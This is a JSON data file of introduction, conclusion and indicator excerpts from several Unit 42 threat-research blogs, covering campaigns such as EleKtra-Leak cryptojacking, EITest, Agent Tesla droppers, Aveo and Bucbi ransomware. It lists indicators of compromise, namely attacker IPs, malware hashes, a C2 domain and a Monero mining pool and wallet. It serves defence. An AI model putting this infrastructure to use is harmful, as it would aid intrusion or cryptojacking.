threat and others. \nPrisma Cloudcan provide alerting and mitigation solutions for the use-cases reported within this blog. \nNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block the attacks.", "source": "Palo"}, {"title": "Conclusion", "content": "Even though the threat actors were able to accomplish a lot in these attacks, we saw that there's some great remediation steps organizations can put in place to better protect themselves. Since access keys are the most common initial attack vector, try to avoid the use of long-term access keys when possible. In AWS, this means using EC2 Roles, IAM Roles Anywhere or Identity Center integration for developer workstations. Another layer to protect those keys is setting up monitoring around abnormal usage. With these attacks, the threat actors performed abnormal API calls, which is all detectable with long-tail log analysis.\nIt's also imperative to do basic least-privilege analysis so that code running inside or outside the cloud has only the permissions it needs to do its job.\nYou always want to make sure that you're monitoring your cloud accounts for abnormal activity in addition to monitoring access keys. In AWS this can look like monitoring various services such as CloudTrail, VPC flow logs and S3 server access logs. If services within your cloud account are being accessed by or reaching out to new and unusual IP addresses over abnormal ports, you want to make sure your monitoring is configured to alert on this activity. Also, if your organization has sensitive data in S3 buckets, monitoring S3 server access logging to note abnormal calls to the bucket helps proactively find attacks.\nAnd finally, the threat actors were able to accomplish all that they did in these cases because of the lack of granular permissions. If these compromised access keys that belonged to IAM Users had fewer permissions, that would have stopped the threat actors in their tracks.", "source": "Palo"}, {"title": "Indicators", "content": "IPs:\n13[.]90.77.93 \n31[.]132.2.66\nUser Agents:\nBoto3/1.26.45 Python/3.9.2 Linux/6.0.0-2parrot1-amd64 Botocore/1.29.45 \nBoto3/1.7.61 Python/3.5.0 Windows/ Botocore/1.10.62 \naws-cli/1.19.1 Python/3.9.2 Linux/6.0.0-2parrot1-amd64 botocore/1.29.58 \naws-cli/1.18.69 Python/3.5.2 Linux/4.4.0-1128-aws botocore/1.16.19 \nScout Suite/5.12.0 Python/3.9.2 Linux/6.0.0-2parrot1-amd64 Scout Suite/5.12.0\nUpdated August 16, 2023, at 1:45 p.m. PT to add Cortex protections information.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers examine several malware samples that incorporate Cobalt Strike components, and discuss some of the ways that we catch these samples by analyzing artifacts from the deltas in process memory at key points of execution. We will also discuss the evasion tactics used by these threats, and other issues that make their analysis problematic.\nCobalt Strikeis a clear example of the type of evasive malware that has been a thorn in the side of detection engines for many years. It is one of the most well-known adversary simulation frameworks for red team operations. However, it's not only popular among red teams, but it is also abused by many threat actors for malicious purposes.\nAlthough the toolkit is only sold to trusted entities to conduct realistic security tests, due to source code leaks, its various components have inevitably found their way into the arsenal of malicious actors ranging from ransomware groups to state actors. Malware authors abusing Cobalt Strike even played a role in the infamousSolarWinds incidentin 2020.", "source": "Palo"}, {"title": "Conclusion", "content": "Although Cobalt Strike has been around for some years, detecting it is still a challenge to many security software providers. That is because this tool works mostly in memory and doesn't touch the disk much, other than with the initial loader.\nWe've looked into three new loaders and showed how they can be detected using a variety of techniques. These detection techniques are available within our new hypervisor based sandbox.\nFigure 10 illustrates our detection reasons for KoboldLoader.\nPalo Alto Networks customers receive protections from these threats:\nAdvanced WildFireidentifies the Cobalt Strike loaders and beacons as malicious. \nCortex XDRprotects endpoints and identifies the loaders as malicious.", "source": "Palo"}, {"title": "Indicators", "content": "KoboldLoader\n7ccf0bbd0350e7dbe91706279d1a7704fe72dcec74257d4dc35852fcc65ba2926ffedd98d36f7c16cdab51866093960fe387fe6fd47e4e3848e721fd42e11221fc4b842b4f6a87df3292e8634eefc935657edf78021b79f9763548c74a4d62b8062aad51906b7b9f6e8f38feea00ee319de0a542a3902840a7d1ded459b28b8da221c7f70652f4cc2c76c2f475f40e9384a749acd1f0dbaefd1a0c5eb95598d2\nMagnetLoader\n6c328aa7e0903702358de31a388026652e82920109e7d34bb25acdc88f07a5e0\nLithiumLoader\n8129bd45466c2676b248c08bb0efcd9ccc8b684abf3435e290fcf4739c0a439f82dcf67dc5d3960f94c203d4f62a37af7066be6a4851ec2b07528d5f0230a355\nLithiumLoader Installer\na1239c93d43d657056e60f6694a73d9ae0fb304cb6c1b47ee2b38376ec21c786cbaf79fb116bf2e529dd35cf1d396aa44cb6fcfa6d8082356f7d384594155596", "source": "Palo"}, {"title": "Introduction", "content": "EITest is a long-running campaign that uses exploit kits (EKs) to distribute a variety of malware. This campaign wasfirst identified in October 2014, and we reviewedhow the EITest campaign evolvedin a March 2016 blog post. In this blog post, I'll give an update of how the EITest campaign has evolved since March including the changes in patterns and the chain of events that lead to a successful infection.\nThe first major change came in June 2016 afterAngler EK disappeared. Until that point, the EITest campaign consistently used Angler EK.Many campaigns switched to Neutrino EKafter Angler EK disappeared, and EITest followed suit.\nBy August 2016, theEITest campaign switched to Rig EKfor its malware distribution. Although we have also seen EITestuse Neutrino EKsince then, the campaign has primarily used Rig EK leading up to October 2016.\nFigure 1: Flow chart for an infection from the EITest campaign.", "source": "Palo"}, {"title": "Conclusion", "content": "Now entering its third year, the EITest campaign continues to evolve. After Angler EK disappeared in June 2016, EITest switched to Neutrino EK and is now primarily using Rig EK. This campaign continues to distribute a variety of malware and shows no signs of stopping any time soon.\nDomains, IP addresses, and other indicators associated with this campaign are constantly changing. Palo Alto Networks customers are protected from the EITest campaign through our next-generation security platform, includingTraps, our advanced endpoint solution which prevent EKs from compromising a system. We continue to investigate this activity to inform the community and further enhance our threat prevention.", "source": "Palo"}, {"title": "Indicators", "content": "The EITest gate uses an ever-changing variety of domain names. However, the IP addresses remain consistent over the course of several days or weeks.  Below are some of the IP addresses used for the EITest gate URLs we have found so far in 2016. Each IP address is preceded by the date it was first seen.  Some of IP addresses have occasionally reappeared well after their first seen date.\n2015-12-29: 85.93.0.32 \n2016-02-03: 104.129.198.32 \n2016-02-24: 85.93.0.33 \n2016-03-16: 85.93.0.34 \n2016-04-01: 85.93.0.68 \n2016-05-18: 85.93.0.81 \n2016-06-06: 85.93.0.72 \n2016-06-11: 85.93.0.43 \n2016-07-18: 85.93.0.12 \n2016-08-17: 85.93.0.13 \n2016-08-25: 85.93.0.110 \n2016-08-30: 194.165.16.202 \n2016-09-01: 194.165.16.203 \n2016-09-02: 194.165.16.204 \n2016-09-08: 31.184.193.168 \n2016-09-14: 31.184.192.188 \n2016-09-19: 31.184.193.187", "source": "Palo"}, {"title": "Introduction", "content": "Traditional ransomware mainly targets on-premises IT infrastructure but doesn't work well in cloud environments, which is one reason we haven't heard much about ransomware in public clouds. However, ransomware actors could adapt their tactics, techniques and procedures (TTPs) to be more cloud native, and now is a good time for organizations to get ahead of this possibility.\nRansomware incidents have severely disrupted business operations across all industries. In 2021, theaverage ransom demandwas $2.2 million, and the average payment was $541,010. Since 2020, researchers have detected at least130 different ransomware families. There is still no sign of a decrease in the frequency and severity of ransomware attacks.\nWhile there are many known ransomware families, there is no known ransomware actor targeting cloud environments. With the increasing demands of the remote workforce, many organizations aremigrating on-premises data centersto the public clouds. Cloud-native infrastructure is also the de facto way that startups can quickly build their business.\nHere, we explore how ransomware threat actors might operate in cloud environments \u2013 what approaches they might use to attack and impact resources in public clouds. We ask questions including:\nAre cloud-hosted resources more resilient to ransomware attacks? \nWhat types of cloud resources are more vulnerable to ransomware? \nHow might adversaries attack cloud resources?\nOur goal is to help organizations prepare for this threat while it is still largely theoretical. The discussed scenarios are intended to be broad and not specific to any cloud service provider.\nKnowing that threat actors such asRockeandTeamTNTtarget unsecured cloud environments, it is sensible that ransomware actors will also turn to the cloud sooner or later. Due to the fundamental difference between cloud-native and on-premises IT infrastructure, existing ransomware will not be effective in attacking cloud environments. Ransomware actors will need new TTPs in order to target cloud workloads.\nHowever, we have seen threat actors evolve in this way to target cloud workloads before. In our latest Cloud Threat Report, \"IAM The First Line of Defense,\" we designatedcloud threat actorsas a new type of threat, defining a cloud threat actor as \"an individual or group posing a threat to organizations through directed and sustained access to cloud platform resources, services or embedded metadata.\"\nRansomware actors may also find ways to adapt to the cloud \u2013 especially if they begin to see the rewards as worth the effort. Unit 42 researchers identified the possible infection vectors, vertical/lateral movements, targeted resources and impact of such attacks. We incorporated our knowledge of existing ransomware groups and known security incidents in public clouds to derive possible TTPs of cloud-targeted ransomware attacks.\nOverall, we believe that cloud environments are more resilient to ransomware.Theshared responsibility modelsignificantly reduces users' burden in securing the infrastructure, platform and software in the cloud. API-driven cloud services make monitoring, automation and centralized access control easier. Cloud-native backup services provide reliable ways to back up cloud resources. Nevertheless, it is the user's responsibility to securely configure, operate and monitor cloud workloads. As IT infrastructure grows with the business, securing thousands of dynamic workloads in a multi-cloud and hybrid cloud environment can become challenging.\nPalo Alto Networks customers can get ahead of potential cloud-based ransomware through Prisma Cloud'sthreat detectioncapability, which can identify anomalies and zero-day attacks. Unit 42 offers aransomware readiness assessmentthat organizations can use to enhance the ability to quickly and effectively respond to a ransomware attack.Cloud incident response servicescan help address and mitigate cloud security incidents if they do happen.", "source": "Palo"}, {"title": "Conclusion", "content": "Public clouds offer agile, reliable and scalable storage services that on-premises data centers would find almost impossible to keep up with. As cloud adoption is getting faster and more prevalent, cybercriminals will also find new ways to go after valuable data.\nAlthough we have not seen ransomware groups targeting cloud environments, ransomware attacks are probable and concerning, and the time to consider and prepare for the possibility of ransomware in the cloud is now. Our hypothetical attack demonstrates that control plane APIs could be abused to encrypt data in cloud storage and database.\nOverall, we think public clouds are more secure and resilient against ransomware attacks than traditional environments. Centralized APIs, immutable workloads and cloud native-backup services all make protecting cloud resources easier. In a shared responsibility model, users can focus more on the applications, and the CSPs take care of the infrastructure, platform or software, which significantly reduces the attack surface compared to an on-premises data center. With the assistance ofCloud Security Posture Management (CSPM),Cloud Workload Protection Platform (CWPP)orCloud Infrastructure Entitlement Management (CIEM)solutions, this also makes managing thousands of dynamic cloud workloads feasible.\nUnit 42 offers aransomware readiness assessmentthat organizations can use to enhance the ability to quickly and effectively respond to a ransomware attack.Cloud incident response servicescan help address and mitigate cloud security incidents if they do happen.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "Introduction", "content": "Recently, Unit 42 has observed active exploits related to an open-source service calledInteractsh. This tool can generate specific domain names to help its users test whether an exploit is successful. It can be used by researchers \u2013 but also by attackers \u2013 to validate vulnerabilities via real-time monitoring on the trace path for the domain. Researchers creating a proof of concept (PoC) for an exploit can insert Interactsh to check whether the PoC is working, but the service could also be used by attackers who want to be sure an exploit is working.\nThis blog will first introduce the Interactsh tool and how researchers or attackers can leverage it to perform vulnerability validation. We then describe some of the many exploits in the wild leveraging this tool, and we rank the exploits we've observed by popularity. In addition, we analyze Interactsh activity distribution in terms of dates and location. Lastly, we have included information about the malicious payloads for your reference.\nCustomers with Palo Alto NetworksNext-Generation Firewallare protected against benign append attacks that use Interactsh.", "source": "Palo"}, {"title": "Conclusion", "content": "Even though Interactsh can be used for legitimate purposes, it is widely used by attackers to test malicious traffic. Its testing traffic therefore could be followed by a series of exploits. The trend of using third-party open-source tools to test exploits has become more popular in the last few years. It is convenient for attackers to use open-source tools, and it is hard for defenders to simply block this traffic by services/IP/server etc. To help organizations defend against malicious exploits that originate this way, we need to raise awareness about the tool.\nPalo Alto NetworksNext-Generation Firewallcustomers who useThreat Prevention,Advanced URL Filtering,DNS SecurityandWildFiresecurity subscriptions are protected against benign append attacks that use Interactsh. DNS Security has markedinteract[.]shas a malicious site.\nWe also recommend the following actions:\nRun aBest Practice Assessmentto identify where your configuration could be altered to improve your security posture. \nContinuously update your Next-Generation Firewalls with the latest Palo Alto NetworksThreat Preventioncontent (e.g. versions 8467 and above).", "source": "Palo"}, {"title": "Introduction", "content": "FollowingLog4Shell, AWS released severalhot patch solutionsthat monitor for vulnerable Java applications and Javacontainersand patch them on the fly. Each solution suits a different environment, covering standalone servers, Kubernetes clusters, Elastic Container Service (ECS) clusters and Fargate. The hot patches aren't exclusive to AWS environments and can be installed onto any cloud or on-premises environment.\nUnit 42 researchers identified severe security issues within these patching solutions and partnered with AWS to remediate them. After installing the patch service to a server or cluster, every container in that environment can exploit it to take over its underlying host. For example, if youinstalled the hot patch to a Kubernetes cluster, every container in your cluster can now escape until you either disable the hot patch or upgrade to the fixed version. Aside from containers, unprivileged processes can also exploit the patch to escalate privileges and gain root code execution.\nContainers can escape regardless of whether they run Java applications, or whether their underlying host runsBottlerocket, AWS's hardened Linux distribution for containers. Containers running withuser namespacesor as a non-root user are affected as well. Unit 42 assigned CVE-2021-3100, CVE-2021-3101, CVE-2022-0070 and CVE-2022-0071 to track the vulnerabilities.\nAWS released a fixed version for each hot patch solution on April 19:\nVersion 1.1-16 of thelog4j-cve-2021-44228-hotpatchpackage, which bundles the hot patch service. \nVersion 1.1-16 of thekubernetes-log4j-cve-2021-44228-node-agentDaemonset, which installs the updated package. \nVersion 1.02 ofHotdog, a hot patch solution for Bottlerocket hosts based on Open Container Initiative (OCI) hooks.\nUnit 42 advises anyone who installed any of these hot patches to upgrade to a fixed version. Note that starting from Dec. 17, 2021, JDK packages (Java installations) on Amazon Linuxautomatically installedthelog4j-cve-2021-44228-hotpatchpackage. Alternatively, users who are confident their applications are patched against Log4Shell can disable the hot patch service following the instructions in the Mitigations section below.\nPrisma Clouddetects the hot patch package and will alert on hosts running a vulnerable version.", "source": "Palo"}, {"title": "Conclusion", "content": "Given the urgency surrounding Log4Shell, users may have deployed hot patches at scale, inadvertently putting container environments at risk. We encourage users to upgrade to the fixed hot patch version as soon as possible. Multitenant container environments and clusters running untrusted images are especially at risk.\nIf you're still patching against Log4Shell, prioritize that effort first. While the presented issues can lead to severe attacks against container environments, Log4Shell has rightfully earned its spot as one of the worst vulnerabilities of all time and is still being actively exploited.\nWe'd like to thank AWS for their partnership and coordination in remediating this vulnerability efficiently. As Log4Shell exploitation peaked, AWS's hot patch helped the community stop countless attacks. With these vulnerabilities fixed, it's now possible to use the hot patch to address Log4Shell while also keeping container environments secure.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers continually observe network attacks and search for insights that can assist defenders. Here, we summarize key trends from November 2021 to January 2022. In the following sections, we present our analysis of the most recently published vulnerabilities, including the severity distribution. We also classify vulnerabilities to provide a clear view of the prevalence of, for example, cross-site scripting or denial of service.\nCross-site scripting stood out as a commonly used technique. Among around 6,443 newly published vulnerabilities, we found that a large portion (almost 10.6%) still involve this technique. However, by evaluating around 167 million attack sessions and focusing on the latest exploits in the wild, we conclude that remote code execution is still a great concern, while information disclosure and traversal is ranking high when we categorize those attacks. Defenders should pay attention to the trends and adjust mitigation methodology accordingly.\nAdditionally, we provide insight into how the vulnerabilities are actively exploited in the wild based on real-world data collected fromPalo Alto Networks Next-Generation Firewalls. For example, we chart a timeframe showing how frequently the most commonly exploited vulnerabilities were attacked through networks and the locations from which the attacks appeared to originate. We then draw conclusions about the most commonly exploited vulnerabilities the attackers are using, as well as the severity, category and origin of each attack.\nPalo Alto Networks Next Generation Firewall customers are protected from the vulnerabilities discussed here bycloud-delivered security subscriptions, includingThreat PreventionandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "Due to the huge impact of the Log4j vulnerability (CVE-2021-44228,CVE-2021-45046) and its publicly available proof of concept, we observed an unprecedented amount of attacks during this quarter, where most attacks started right after the details of exploitation were disclosed. This kind of proactivity on the part of cybercriminals suggests that more attention should be paid to severe vulnerability incidents. Corresponding patches should be applied promptly with best security practices implemented.\nWhile cybercriminals will never cease their malicious activities, Palo Alto Networks customers are fully protected from the attacks discussed here byNext-Generation Firewalls. Additional mitigations include:\nRun aBest PracticeAssessment to identify where your configuration could be altered to improve your security posture. \nContinuously update your Next-Generation Firewalls with the latest Palo Alto NetworksThreat Preventioncontent (e.g. versions 8572 and above).", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have identified an active campaign we are calling EleKtra-Leak, which performs automated targeting of exposed identity and access management (IAM) credentials within public GitHub repositories. AWS detects and auto-remediates much of the threat of exposed credentials in popular source code repositories by applying a special quarantine policy - but by manually removing that automatic protection, we were able to develop deeper insights into the activities that the actor would carry out in the case where compromised credentials are obtained in some other way.\nIn those cases, the threat actor associated with the campaign was able to create multiple AWS Elastic Compute (EC2) instances that they used for wide-ranging and long-lasting cryptojacking operations. We believe these operations have been active for at least two years and are still active today.\nWe found that the actor was able to detect and use the exposed IAM credentials within five minutes of their initial exposure on GitHub. AWS's automatically applied quarantine policy limited the actor's ability to operate, but by removing that policy we gained deep insight into the design and automation behind this campaign.\nThis finding and our broader research specifically highlights how threat actors can leverage cloud automation techniques to achieve their goals of expanding their cryptojacking operations.\nWe will discuss the threat actor's operation and how we architected our Prisma Cloud HoneyCloud project to detect and monitor the operation. The HoneyCloud project is a Prisma Cloud Security team research operation to expose a fully compromisable cloud environment that is designed to monitor and track any malicious operations that occur. Prisma Cloud uses this project to gather intelligence about potential attack path scenarios and threat actor operations in an attempt to provide defensive solutions for our cloud customers.\nDuring our monitoring of the cryptojacking pool used in the EleKtra-Leak operation, Aug. 30-Oct. 6, 2023, we found 474 unique miners that were potentially actor-controlled Amazon EC2 instances. Because the actors mined Monero, a type of cryptocurrency that includes privacy controls, we cannot track the wallet to obtain exact figures of how much the threat actors gained.\nThe threat actor appears to have used automated tools to continually clone public GitHub repositories and scan for exposed Amazon Web Services (AWS) IAM credentials. The threat actor also appeared to blocklist AWS accounts that routinely expose IAM credentials, in what we believe to be an effort to prevent security researchers from following their operations. The threat actors might have perceived them to be obvious honey traps.\nTo counter this protective operation, we automated the creation of randomized AWS and user accounts with targeted overly-permissive IAM credentials. This allowed us to track the actor's movements. We committed this information to a randomly generated GitHub repository that publicly exposed the researcher's IAM credentials.\nAccording to the Unit 42Cloud Threat Report Volume 7, 83% of organizations expose hard-coded credentials within the production code repositories. The report offers recommendations that organizations can use to improve security around IAM credentials.\nWe also close this article with a few generalrecommendationsthat can help protect against the threat actor activity described here. Finally, it is critical that all users of cloud resources understand the cloudShared Responsibility Model. In short, users and organizations are responsible for any configurations, patching, maintenance and security monitoring for their cloud applications, IAM policies and used resources. Build responsibly.\nPalo Alto Networks customers receive protection from this type of issue through the features described here in the following ways:\nThePrisma Cloud Secrets Security modulecan detect and block secrets prior to and post-exposure in repositories, validating them for AWS IAM credentials to determine if they are privileged and therefore have a higher impact when exposed. \nThe Prisma Cloud continuous integration and continuous delivery (CI/CD) modulecan detect misconfigurations, vulnerabilities and the exposure of secrets within public and private infrastructure as code (IaC) repositories such as GitHub. This module can also track the malicious actions of compromised GitHub actions and workload runners. \nBy monitoring GitHub audit events such as cloning GitHub repositories, the CI/CD module can detect the events discussed within this article and protect organizations from adversaries taking advantage of exposed IAM credentials. \nPalo Alto NetworksCortex XDR for cloudleverages data from cloud hosts, cloud traffic and audit logs and combines them with endpoint and network data. This dataset allows XDR to detect unusual cloud activity that correlates with known TTPs such as cloud compute credentials theft, cryptojacking and data exfiltration.", "source": "Palo"}, {"title": "Background", "content": "From a research perspective, one of the challenges of purposefully leaking AWS keys is that once the threat actor identifies them, the keys can be easily attributed to the correspondingAWS account. We found that the actor can likely recognize frequently recurring AWS account IDs, blocking those account IDs from future attacks or automation scripts. Because of this, we designed a novel investigation architecture to dynamically create and leak AWS keys that are non-attributable. We will discuss this more in thesecond sectionof this article.\nAttackers have increased their usage of GitHub as an initial vector of compromise over the years. One powerful feature of GitHub is that it enables the capability to list all public repositories, which is very helpful for its users to easily track developments in topics of interest. This allows developers \u2013 and unfortunately threat actors \u2013 to track new repositories in real time.\nGiven this capability, we selected GitHub as the platform for our experiment in leaking AWS keys. We wrote the plaintext leaked keys to a file in a newly created GitHub repository that we randomly selected and cloned from a list of public GitHub repositories. We leaked the AWS keys to a randomly created file inside of the cloned repository and then deleted them after they were successfully committed.\nWe immediately deleted the leaked keys once they were committed to the repository, to avoid the innate appearance of trying to lure threat actors. Initially, the IAM keys were encoded in Base64. However, no threat actor found the keys, even though tools liketrufflehogcan find exposed Base64 IAM keys.\nWe believe that the identified threat actor is not using tools capable of decoding Base64-encoded credentials at this time. One of the reasons for this is probably because those tools are sometimes noisy and generate many false positives.\nWe followed up by experimenting with leaking AWS keys in cleartext, which the threat actor did find. These were written in cleartext and hidden behind a past commit in a random file added to the cloned repo.", "source": "Palo"}, {"title": "Conclusion", "content": "We discovered a threat actor's operation that scanned for exposed AWS IAM credentials within public GitHub repositories. We found that the threat actor can detect and launch a full-scale mining operation within five minutes from the time of an AWS IAM credential being exposed in a public GitHub repository.\nThe operation we found has been in action since at least 2020. Despite successful AWS quarantine policies, the campaign maintains continuous fluctuation in the number and frequency of compromised victim accounts. Several speculations as to why the campaign is still active include that this campaign is not solely focused on exposed GitHub credentials or Amazon EC2 instance targeting.\nWe developed a semi-automatic IaC Terraform architecture to track the operations of this threat actor group. This included the dynamic creation of AWS accounts designed to be compromised and destroyed.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Backup.tibSHA256:87366652c83c366b70c4485e60594e7f40fd26bcc221a2db7a06debbebd25845\nAppworkerSHA256:240fe01d9fcce5aae311e906b8311a1975f8c1431b83618f3d11aeaff10aede3\nEC2 User DataSHA256:2f0bd048bb1f4e83b3b214b24cc2b5f2fd04ae51a15aa3e301c8b9e5e187f2bb\nXMR Pool Address:pool[.]supportxmr[.]com:443\n82sdgJwuAMTF6w76Q7KrN4jJL72v23gvf9K2favHYHKxCNP4UabmBsJMwAVGWDLYagW5UmykC2D1zaMoQegZLy2bF9ynM1E\nUpdated Oct. 30, 2023, at 12:20 p.m. PT to add additional Prisma Cloud protections.\nUpdated Nov. 6, 2023, at 12:07 p.m. PT to add clarifying language to the executive summary.", "source": "Palo"}, {"title": "Introduction", "content": "Between July 27 and Dec. 1, 2021, Unit 42 researchers observed a new surge of Agent Tesla and Dridex malware samples, which have been dropped by Excel add-ins (XLL) and Office 4.0 macros. We have found that the Excel 4.0 macro dropper is mainly used to drop Dridex, while the XLL droppers are used to drop both Agent Tesla and Dridex. While malicious XLL files have been known for quite some time, their reappearance in the threat landscape is a new trend and possibly indicates a shift toward this infection vector.\nThe XLL files we observed were mainly distributed via emails that contain price quote luring contents sent from an abcovid[.]tech email address with the email subject \"INQUIRY.\" Targets of these emails include organizations in the following sectors: manufacturing; retail; federal, state and local government; finance; pharmaceuticals; transportation; education; and several others across the United States, Europe and Southeast Asia. Furthermore, some of the malicious XLL files we have seen abuse a legitimate open-source Excel add-in framework namedExcel-DNA.\nThis blog is the first of a two-part series. Here, we take a look into the XLL file attributes, the abused legitimate open-source framework and the final Agent Tesla payload. The second part of the series will deal with the other infection flows, the XLL and Excel 4 (XLM) droppers that deliver Dridex samples.\nPalo Alto Networks customers receive protections against the attacks discussed here throughCortex XDRor theWildFirecloud-delivered security subscription for theNext-Generation Firewall.", "source": "Palo"}, {"title": "Conclusion", "content": "For the recent surge of malware we observed, we analyzed the infection chain that uses Excel add-ins (XLL). We also described how the malware author abuses the legitimate Excel-DNA framework for the creation of these malicious XLLs. Lastly, we briefly described the final Agent Tesla payload and which information it tries to exfiltrate from a victim's system, with a focus on the Windows Vault data. The usage of Excel add-ins in recent attacks may indicate a new trend in the threat landscape.\nIn the next part of this series, we will describe the other infection chain, which involves using Excel 4.0 macros to deliver Dridex.\nPalo Alto Networks customers receive protections against the attacks discussed here throughCortex XDRor theWildFirecloud-delivered security subscription for theNext-Generation Firewall.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto Networks has identified a malware family known as 'Aveo' that is being used to target Japanese speaking users. The 'Aveo' malware name comes from an embedded debug string within the binary file. The Aveo malware family has close ties to the previously discussed FormerFirstRAT malware family, which was also witnessedbeing used against Japanese targets. Aveo is disguised as a Microsoft Excel document, and drops a decoy document upon execution. The decoy document in question is related to a research initiative led by the Ido Laboratory at the Saitama Institute of Technology. Upon execution, the Aveo malware accepts a number of commands, allowing attackers to take full control over the victim machine.", "source": "Palo"}, {"title": "Conclusion", "content": "Aveo shares a number of characteristics with FormerFirstRAT, including encryption routines, code reuse, and similarities in C2 functionality. Aveo is far from the most sophisticated malware family around. As witnessed in the previously discussed FormerFirstRAT sample, this related malware family also looks to be targeting Japanese speaking users. Using a self-extracting WinRAR file, the malware drops a decoy document, a copy of the Aveo malware, and a cleanup script.\nPalo Alto Networks customers are protected from this threat in the following ways:\nAn AutoFocus tag has beencreatedto track and monitor this threat \nWildFire classifies Aveo samples as malicious \nC2 domains listed in this report are blocked through Threat Prevention.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 Hashes\n9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e28101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d\nC2 Domains\nsnoozetime[.]info\nRegistry Keys\nHKCU\\software\\microsoft\\windows\\currentversion\\run\\msnetbridge\nFile Paths\n%APPDATA%\\MMC\\MMC.exe%TEMP%\\MMC\\MMC.exe", "source": "Palo"}, {"title": "Introduction", "content": "The Latin America (LATAM) region is geographically large and diverse, stretching from the northern border of Mexico to the southern tip of South America. It is also one of the fastest growing and largest regions of Internet users, recently surpassing North America (NAM) in sheer volume of users with Internet access. In just the last few years, the region has experienced an explosive growth in the number of users going online, and with it we've seen a similar expansion in the potential challenges that accompany growth. This blog discusses the threat trends Unit 42 has observed from July until December of 2016 in LATAM.", "source": "Palo"}, {"title": "Conclusion", "content": "LATAM is a rapidly expanding region of Internet users that has no signs of slowing down. Criminals in particular seem to be quite aware of this phenomenon and appear to be treating the region as an emerging market to be leveraged. We know ransomware such as Locky has been largely victim-agnostic, but it has at times been questioned if certain regions might be more likely to pay a ransom versus others, which may lead to perhaps larger volume of attacks or more concentrated attacks against specific regions. The data collected and analyzed in this blog shows that this is unlikely to be the case, as ransomware activity appears to be just as voluminous in the LATAM region as any other region in the world.\nThe appearance of information stealers and banking Trojans activity is also interesting, as it may indicate that criminals have become aware of more users in LATAM using online banking and other online services in their everyday lives.\nAs the LATAM region continues to expand and develop, it is imperative that strong cybersecurity strategies are deployed throughout the region. Leveraging basic policies such as enforcing user privileges, blocking executable attachments in emails, and keeping applications patched can be extremely powerful in denying the adversaries their objectives. Pairing these policies with effective implementation of security technologies can further increase the efficacy of our strategies and allow us to maintain a strong security posture throughout the region.\nIgnite '17 Security Conference: Vancouver, BC June 12\u201315, 2017\nIgnite '17 Security Conference is a live, four-day conference designed for today's security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit theIgnite websitefor more information on tracks, workshops and marquee sessions.", "source": "Palo"}, {"title": "Introduction", "content": "Sophisticated malware, such asEmotetandSality, and advanced persistent threats (APTs), such as the recentSolarStormattack, emphasize the necessity for advanced detection methods to identify novel, unknown types of malicious network traffic.\nCurrent intrusion prevention systems (IPS) typically work based on signature matching and monitoring network traffic for known patterns in the data packets. Such static methods fall short in detecting unknown types of malware-generated network traffic, which calls for more advanced detection techniques that incorporate inspection of the overall packet structure, rather than specific static patterns.\nIn a blog ondata leakage from Android apps, Unit 42 researchers demonstrated that unknown traffic types that leak sensitive user information could be detected using machine learning techniques.\nBased on command and control (C2) traffic from malware, such as Sality and Emotet, this blog analyzes how deep learning models are further able to identify modified and incomplete C2 traffic packets. This analysis illustrates that the usage of machine learning techniques in IPS can discover yet unseen variants of C2 traffic and can help detect advanced attack campaigns.\nPalo Alto NetworksNext-Generation Firewallcustomers are protected from such types of attacks by IPS and AppID in ourThreat Preventionsecurity subscription and with malware analysis and prevention through ourWildFiresecurity subscription.", "source": "Palo"}, {"title": "Conclusion", "content": "Our research on using deep learning for C2 traffic detection shows the potential and necessity to use advanced machine learning for intrusion detection and prevention. For novel attacks and zero-day vulnerabilities, it is critical to rely on systems that can identify attacks based on known traffic features and identify unknown types of malicious network traffic to detect and prevent advanced threat campaigns at an early stage. The results Unit 42 sees in various research projects directly contribute to Threat Prevention and WildFire security subscriptions to ensure the protection of our Next-Generation Firewall customers.", "source": "Palo"}, {"title": "Introduction", "content": "The Bucbi ransomware family, which dates back to early 2014, has received a significant update. In a recently observed attack, we also noted new tactics used to infect systems. The malware has historically been delivered via an HTTP download, most likely via an exploit kit or phishing email. However, in recent weeks, Palo Alto Networks researchers have observed attackers brute-forcing RDP accounts on Internet-facing Windows servers to deliver their malware. Additionally, the malware itself has been modified to no longer require an Internet connection.\nRecent ransom notes left on infected systems identify the malware as belonging to the \"Ukrainian Right Sector,\" a far-right Ukrainian nationalist political party with paramilitary operations that opposes Russia but operate outside of the Ukrainian government's authority. However, there are a number of Russian identifiers in the recent attacks. Consequently, it is unclear if the claims of responsibility by the \"Ukrainian Right Sector\" are accurate, and if so, what the reason behind and significance of the Russian identifiers.", "source": "Palo"}, {"title": "Conclusion", "content": "Overall, this proved to be a curious attack, as the attackers originally gained access using techniques common to those of attacks seen against point of sale devices. It appears that once access was acquired, the attackers shifted gears to deploy a new variant of the fairly old Bucbi ransomware family. This particular variant purports to belong to the 'Ukrainian Right Sector', a far-right Ukrainian national political party. If true, this would indicate that this particular national political party has entered the ransomware space, potentially to fund their cause. However, various Russian-related strings and references leave doubt as to who exactly is behind this attack. Attribution of this particular 